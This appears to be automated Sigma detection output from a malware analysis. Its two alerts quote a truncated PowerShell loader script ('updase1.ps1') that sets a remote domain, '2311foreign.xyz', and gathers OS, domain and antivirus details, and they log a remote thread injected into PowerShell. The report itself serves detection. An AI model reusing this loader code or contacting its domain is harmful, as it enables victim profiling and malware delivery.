sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values:
@{ScriptBlockText=$SS = Get-Random -Minimum 1500 -Maximum 3000
sleep -Milliseconds $SS
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$LoadDomen = "https://2311foreign.xyz"


$osCaption = (Get-WmiObject -Class Win32_OperatingSystem).Caption
$urlEncodedOsCaption = [System.Net.WebUtility]::UrlEncode($osCaption)
$domain = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Domain
$AV = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
 [TRUNCATED]; Path=C:\Users\Bruno\Desktop\updase1.ps1; ScriptBlockId=40303217-7e67-4fd4-9102-f77e6ff36e82; MessageTotal=1; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_title: Remote Thread Created In Shell Application
sigma_analysis_results.rule_description:
Detects remote thread creation in command shell applications, such as "Cmd.EXE" and "PowerShell.EXE".
It is a common technique used by malware, such as IcedID, to inject malicious code and execute it within legitimate processes.

match_context.values: @{SourceProcessId=532; SourceProcessGuid={4434127c-9ed8-67dd-0900-00000000ad00}; TargetProcessId=4160; EventID=8; SourceImage=<unknown process>; StartFunction=CtrlRoutine; TargetProcessGuid={4434127c-f802-67ee-0101-00000000ad00}; StartModule=C:\Windows\System32\KERNELBASE.dll; TargetImage=C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe; StartAddress=140722057492848; NewThreadId=2200}
